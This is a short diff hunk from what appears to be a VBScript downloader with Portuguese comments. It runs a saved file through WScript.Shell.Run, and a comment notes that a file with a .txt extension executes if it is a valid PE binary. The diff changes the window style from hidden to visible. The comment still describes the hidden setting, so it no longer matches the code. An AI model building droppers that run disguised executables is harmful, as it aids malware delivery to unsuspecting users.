@@ -39,7 +39,7 @@
 
         ' Executar o binário salvo
         ' Mesmo com a extensão .txt, o WScript.Shell.Run pode executá-lo se for um PE válido
-        objShell.Run strFilePath, 0, True ' 0 para ocultar janela, True para esperar terminar
+        objShell.Run strFilePath, 1, True ' 0 para ocultar janela, True para esperar terminar
 
         Set objShell = Nothing
         Set objHTTP = Nothing
